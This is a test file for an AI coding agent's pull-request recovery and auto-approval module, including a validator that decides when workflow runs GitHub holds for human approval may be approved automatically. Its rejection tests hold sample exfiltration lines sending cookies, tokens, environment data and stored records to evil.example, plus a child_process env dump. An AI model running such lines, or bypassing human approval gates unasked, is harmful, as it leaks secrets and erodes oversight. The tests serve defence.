// =============================================================================
// When the agent's own pull request goes red, the system must step in (owner, 2026-11-07: "on ANY failure the AI must
// recover by itself"). Before this, an issue with an open ai-fix PR was claimed forever, so a red PR sat unhandled.
// These pin: what counts as a real failure, the one re-run, the hand-back that closes the PR and tells the agent why,
// and that it can never loop (the hand-back adds no attempt of its own).
// No network: every API call is injected.
// =============================================================================
import { describe, it, expect } from 'vitest';
import {
    issueOfBranch, latestPerCheck, runIdOf, decideRecovery, failureDigest, handbackComment, recoveryBrief, run, RECOVERY_MARKER, MIN_AGE_MS,
    approvalVerdict, heldRuns,
} from '../autonomy/pr-recovery.mjs';
import { attemptsFrom } from '../autonomy/work-queue.mjs';

const NOW = Date.parse('2026-11-07T12:00:00Z');
const OLD = new Date(NOW - 3 * MIN_AGE_MS).toISOString();
const pr = (over = {}) => ({ number: 7, created_at: OLD, head: { ref: 'ai-fix/issue-524-1793997427', sha: 'abc' }, ...over });
const chk = (name, conclusion, over = {}) => ({ id: Math.floor(Math.random() * 1e6), name, status: 'completed', conclusion, completed_at: '2026-11-07T11:50:00Z', details_url: 'https://github.com/o/r/actions/runs/111/job/9', ...over });

describe('which pull requests are the agent\'s', () => {
    it('only ai-fix/issue-<n>-<timestamp> branches, never a person\'s', () => {
        expect(issueOfBranch('ai-fix/issue-524-1793997427')).toBe(524);
        expect(issueOfBranch('claude/project-thread-156kee')).toBeNull();
        expect(issueOfBranch('ai-fix/issue-524-x')).toBeNull();
        expect(issueOfBranch(undefined)).toBeNull();
    });
});

describe('reading the checks', () => {
    it('an older red run that a newer green run replaced is history', () => {
        const l = latestPerCheck([chk('Risk gate', 'failure', { completed_at: '2026-11-07T11:00:00Z' }), chk('Risk gate', 'success', { completed_at: '2026-11-07T11:30:00Z' })]);
        expect(l).toHaveLength(1);
        expect(l[0].conclusion).toBe('success');
    });
    it('finds the workflow run inside the details url', () => {
        expect(runIdOf({ details_url: 'https://github.com/o/r/actions/runs/42289892567/job/1' })).toBe(42289892567);
        expect(runIdOf({})).toBeNull();
    });
});

describe('deciding what to do', () => {
    it('does nothing to a PR that is not the agent\'s', () => {
        expect(decideRecovery({ pr: pr({ head: { ref: 'feature/x' } }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('waits while the first CI pass is young or running, or before anything reported (a bot run waits for approval)', () => {
        expect(decideRecovery({ pr: pr({ created_at: new Date(NOW - 60_000).toISOString() }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', null, { status: 'in_progress' })], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [], now: NOW }).reason).toMatch(/approval/);
    });
    it('a red Risk gate is a person\'s label to give, not a wrong fix', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Risk gate (sensitive paths need human approval)', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('cancelled and skipped runs are not failures; a labeller or commenter cannot prove the code wrong', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'cancelled'), chk('watch', 'skipped'), chk('Enable auto-merge', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('a check that failed on its first attempt is re-run once before it is judged', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('conftest', 'failure')], runAttempts: { 111: 1 }, now: NOW });
        expect(d.action).toBe('rerun');
        expect(d.failed).toEqual([{ name: 'conftest', runId: 111 }]);
    });
    it('a check that failed again after the re-run hands the issue back', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('Tests + fuzz', 'failure'), chk('review', 'success')], runAttempts: { 111: 2 }, now: NOW });
        expect(d.action).toBe('handback');
        expect(d.reason).toMatch(/Tests \+ fuzz/);
    });
    it('all green means nothing to do', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'success')], now: NOW }).action).toBe('wait');
    });
});

describe('telling the agent why it failed, without looping', () => {
    const digest = failureDigest([{ name: 'Tests + fuzz', output: { title: '2 tests failed', summary: '' } }], { 'Tests + fuzz': [{ path: 'test/a_test.js', start_line: 12, message: 'expected 3 to be 4' }, { message: 'The ubuntu-latest label will migrate to Ubuntu 26' }] });
    it('the digest is words: check, title, first annotations, and drops runner noise', () => {
        expect(digest).toContain('**Tests + fuzz**: 2 tests failed');
        expect(digest).toContain('test/a_test.js:12 expected 3 to be 4');
        expect(digest).not.toMatch(/ubuntu/);
    });
    it('the hand-back comment adds NO attempt of its own (the draft comment already spent one), so it cannot loop', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        expect(c).toContain(RECOVERY_MARKER);
        expect(attemptsFrom([{ user: { login: 'github-actions[bot]' }, body: '<!-- wf-agent-attempt -->\nFix drafted', author_association: 'CONTRIBUTOR' }, { body: c }])).toBe(1);
    });
    it('the next try is shown the newest failure first, and an issue with no history gets nothing', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        const brief = recoveryBrief([{ body: 'hello' }, { body: c }]);
        expect(brief).toMatch(/read this before writing anything/);
        expect(brief).toContain('expected 3 to be 4');
        expect(recoveryBrief([{ body: 'hello' }])).toBe('');
    });
});

describe('the whole pass, with the API injected', () => {
    function fake({ attempt }) {
        const calls = [];
        const checks = [chk('Tests + fuzz', 'failure', { id: 5 }), chk('review', 'success')];
        const fetchImpl = async (url, init = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', '');
            const method = init.method || 'GET';
            calls.push(`${method} ${u}`);
            const j = (b, status = 200) => ({ status, ok: status < 300, text: async () => JSON.stringify(b) });
            if (u.startsWith('/pulls?')) return j([pr()]);
            if (u.includes('/check-runs?')) return j({ check_runs: checks });
            if (u.startsWith('/actions/runs/111') && method === 'GET') return j({ run_attempt: attempt });
            if (u.includes('/annotations')) return j([{ message: 'expected 3 to be 4', path: 'test/a_test.js', start_line: 3 }]);
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    it('first failure: re-runs the failed jobs and touches nothing else', async () => {
        const { calls, fetchImpl } = fake({ attempt: 1 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('rerun');
        expect(calls).toContain('POST /actions/runs/111/rerun-failed-jobs');
        expect(calls.some((c) => c.startsWith('PATCH'))).toBe(false);
    });
    it('second failure: explains on the issue, closes the PR, deletes the branch, starts the agent again', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('handback');
        expect(calls).toContain('POST /issues/524/comments');
        expect(calls).toContain('PATCH /pulls/7');
        expect(calls).toContain('DELETE /git/refs/heads/ai-fix/issue-524-1793997427');
        expect(calls).toContain('POST /actions/workflows/autonomous-fix.yml/dispatches');
    });
    it('a dry run reads and decides but changes nothing', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        await run({ env, fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(calls.filter((c) => !c.startsWith('GET'))).toEqual([]);
    });
});

// ---------------------------------------------------------------------------------------------------------------
// GitHub holds every run from the agent's bot login (`action_required`) until a person approves it, so no check ever ran on a
// bot PR (the owner saw "5 workflow approvals pending" on #653, 2026-11-20). The system approves them itself, but only when a
// program has read the file list and found what the build lane writes: a pull request's own workflows run with the repo's secrets.
// ---------------------------------------------------------------------------------------------------------------
describe('approving the runs GitHub holds for the agent', () => {
    const botPr = (over = {}) => ({ number: 653, user: { login: 'github-actions[bot]' }, head: { ref: 'ai-fix/issue-635-1795191383', sha: 'abc', repo: { full_name: 'o/r' } }, base: { repo: { full_name: 'o/r' } }, ...over });
    const f = (filename, patch) => ({ filename, status: 'modified', ...(patch === undefined ? {} : { patch }) });
    const mod = (name = 'wealthflow-x.js', body = "root.WFX = { show: function () { return root.DB.get('expenses'); } };") => f(name, `@@ -0,0 +1,3 @@\n+(function (root) {\n+${body}\n+})(window);`);
    const state = (name = 'autonomy/state/issue-635.json') => f(name, '@@ -1,4 +1,4 @@\n {\n-  "attempts": 1,\n+  "attempts": 2,\n   "signatures": [\n-    "cfbfd5459aa6b765"\n+    "0123456789abcdef"\n   ]');
    const test = (name = 'test/auto-wealthflow-x-y-9.test.js', body = "expect(1).toBe(1);") => f(name, `@@ -0,0 +1,2 @@\n+import { it, expect } from 'vitest';\n+it('a', () => { ${body} });`);
    it('the real #653 change (a module and the agent\'s state file) is approved', () => {
        const v = approvalVerdict({ pr: botPr(), files: [mod('wealthflow-cc-instalment-detail.js'), state()] });
        expect(v.ok).toBe(true);
    });
    it('a new module with its wiring (one script tag, one stamp comment, numeric ceilings) and its proving test is approved', () => {
        const html = '@@ -1,1 +1,3 @@\n+<!-- 2026-11-20: wealthflow-x-y.js, added by the build lane for #9 -->\n+    <script src="wealthflow-x-y.js" defer></script>\n x';
        const budget = '@@ -1 +1 @@\n-    totalJsBytes: 3_101_000, // old\n+    totalJsBytes: 3_121_500, // 2026-11-20: raised for wealthflow-x-y.js; measured 3113260';
        const v = approvalVerdict({ pr: botPr(), files: [mod('wealthflow-x-y.js'), test(), f('index.html', html), f('autonomy/perf-budget.mjs', budget)] });
        expect(v.ok).toBe(true);
    });
    it('a workflow, an autonomy script, a package file or any other file keeps the run held for a person', () => {
        for (const bad of ['.github/workflows/wealthflow-ci.yml', 'autonomy/route.mjs', 'package.json', 'api/ai.js', 'firestore.rules', 'vitest.config.js']) {
            const v = approvalVerdict({ pr: botPr(), files: [mod(), f(bad, '@@ -1 +1 @@\n+x')] });
            expect(v.ok, bad).toBe(false);
        }
    });
    it('index.html is approved only when every changed line is a build-lane script tag or stamp', () => {
        const sneaky = '@@ -1 +1,2 @@\n+<script>fetch("https://evil.example/"+document.cookie)</script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', sneaky)] }).ok).toBe(false);
        const remote = '@@ -1 +1,2 @@\n+<script src="https://evil.example/x.js" defer></script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', remote)] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html')] }).ok).toBe(false); // no patch to read
    });
    it('perf-budget.mjs is approved only for numeric ceiling lines, never for code', () => {
        const code = '@@ -1 +1,2 @@\n+process.env.GH_TOKEN && fetch("https://evil.example/" + process.env.GH_TOKEN);';
        expect(approvalVerdict({ pr: botPr(), files: [f('autonomy/perf-budget.mjs', code)] }).ok).toBe(false);
    });
    it('only the agent\'s own bot login on a branch of this repository', () => {
        expect(approvalVerdict({ pr: botPr({ user: { login: 'someone' } }), files: [mod()] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'ai-fix/issue-635-1795191383', sha: 'a', repo: { full_name: 'fork/r' } } }), files: [mod()] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'feature/x', sha: 'a', repo: { full_name: 'o/r' } } }), files: [mod()] }).ok).toBe(false);
    });
    it('too many files, or no file list, is never approved', () => {
        expect(approvalVerdict({ pr: botPr(), files: Array.from({ length: 9 }, (_, i) => mod(`wealthflow-m${i}.js`)) }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [] }).ok).toBe(false);
    });
    it('what the model wrote is read, not just named: a module the build lane would refuse keeps the run held', () => {
        for (const body of ["root.DB.set('expenses', []);", "fetch('https://evil.example/' + JSON.stringify(root.DB.get('expenses')));", "eval('1')", "const x = '" + 'AIza' + 'Sy' + 'A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6' + "';", "el.innerHTML = v;", "firebase.firestore();"]) {
            expect(approvalVerdict({ pr: botPr(), files: [mod('wealthflow-x.js', body)] }).ok, body).toBe(false);
        }
        expect(approvalVerdict({ pr: botPr(), files: [f('wealthflow-x.js')] }).ok).toBe(false); // no patch to read
    });
    it('a proving test that could read the environment or reach the network keeps the run held', () => {
        for (const body of ["const t = process.env.GITHUB_TOKEN;", "fetch('https://evil.example/');", "req" + "uire('child_process').execSync('env');", "import('node:https');", "fs.writeFileSync('x','y');"]) {
            expect(approvalVerdict({ pr: botPr(), files: [mod(), test('test/auto-wealthflow-x-9.test.js', body)] }).ok, body).toBe(false);
        }
    });
    it('a state file with anything but counters and signatures keeps the run held', () => {
        const bad = f('autonomy/state/issue-635.json', '@@ -1 +1 @@\n+  "redirect": "https://evil.example/x?y=1&z=2 and more text here"');
        expect(approvalVerdict({ pr: botPr(), files: [mod(), bad] }).ok).toBe(false);
    });
    it('a script tag with a query string is not what the build lane writes', () => {
        const html = '@@ -1 +1,2 @@\n+    <script src="wealthflow-x.js?cb=1" defer></script>';
        expect(approvalVerdict({ pr: botPr(), files: [mod(), f('index.html', html)] }).ok).toBe(false);
    });
    it('only completed runs that wait for approval are picked', () => {
        expect(heldRuns([{ id: 1, status: 'completed', conclusion: 'action_required', head_sha: 'a' }, { id: 2, status: 'completed', conclusion: 'success' }, { id: 3, status: 'in_progress', conclusion: null }, { id: 4, status: 'completed', conclusion: 'action_required', head_sha: 'b' }], 'a')).toEqual([1]);
    });

    function fake({ files, runs, movedTo }) {
        const calls = [];
        const j = (body, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(body) });
        const fetchImpl = async (url, opts = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', ''); const method = opts.method || 'GET';
            calls.push(`${method} ${u.split('?')[0]}`);
            if (u.startsWith('/pulls?')) return j([botPr({ created_at: OLD })]);
            if (u.startsWith('/actions/runs?')) return j({ workflow_runs: runs });
            if (u.includes('/pulls/653/files')) return j(files);
            if (u === '/pulls/653') return j(botPr(movedTo ? { head: { ref: 'ai-fix/issue-635-1795191383', sha: movedTo, repo: { full_name: 'o/r' } } } : {}));
            if (u.includes('/approve')) return j({}, 204);
            if (u.includes('/check-runs?')) return j({ check_runs: [] });
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    const held = [{ id: 11, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }, { id: 12, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }];
    it('run(): approves every held run of a PR that passes the check', async () => {
        const { calls, fetchImpl } = fake({ files: [mod('wealthflow-cc-instalment-detail.js'), state()], runs: held });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls).toContain('POST /actions/runs/11/approve');
        expect(calls).toContain('POST /actions/runs/12/approve');
        expect(out.some((o) => o.action === 'approve')).toBe(true);
    });
    it('run(): a branch that moved after its files were read gets nothing approved', async () => {
        const { calls, fetchImpl } = fake({ files: [mod()], runs: held, movedTo: 'def' });
        const lines = [];
        await run({ env, fetchImpl, log: (m) => lines.push(m), now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
        expect(lines.some((l) => /branch moved/.test(l))).toBe(true);
    });
    it('run(): held runs of another commit than the one inspected are never approved', async () => {
        const { calls, fetchImpl } = fake({ files: [mod()], runs: [{ id: 21, status: 'completed', conclusion: 'action_required', head_sha: 'zzz' }] });
        await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): approves nothing when the diff touches a workflow', async () => {
        const { calls, fetchImpl } = fake({ files: [mod(), f('.github/workflows/wealthflow-ci.yml', '@@ -1 +1 @@\n+x')], runs: held });
        await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): WF_AUTO_APPROVE=0 and a dry run both approve nothing', async () => {
        const a = fake({ files: [mod()], runs: held });
        await run({ env: { ...env, WF_AUTO_APPROVE: '0' }, fetchImpl: a.fetchImpl, log: () => {}, now: NOW });
        expect(a.calls.some((c) => c.includes('/approve'))).toBe(false);
        const b = fake({ files: [mod()], runs: held });
        await run({ env, fetchImpl: b.fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(b.calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): a refusal from GitHub is logged with where the setting is, and does not stop the pass', async () => {
        const { fetchImpl } = fake({ files: [mod()], runs: held });
        const refuse = async (url, o) => (String(url).includes('/approve') ? { ok: false, status: 403, text: async () => 'forbidden' } : fetchImpl(url, o));
        const lines = [];
        const out = await run({ env, fetchImpl: refuse, log: (m) => lines.push(m), now: NOW });
        expect(lines.some((l) => /refused to approve run 11/.test(l) && /Settings > Actions/.test(l))).toBe(true);
        expect(Array.isArray(out)).toBe(true);
    });
});
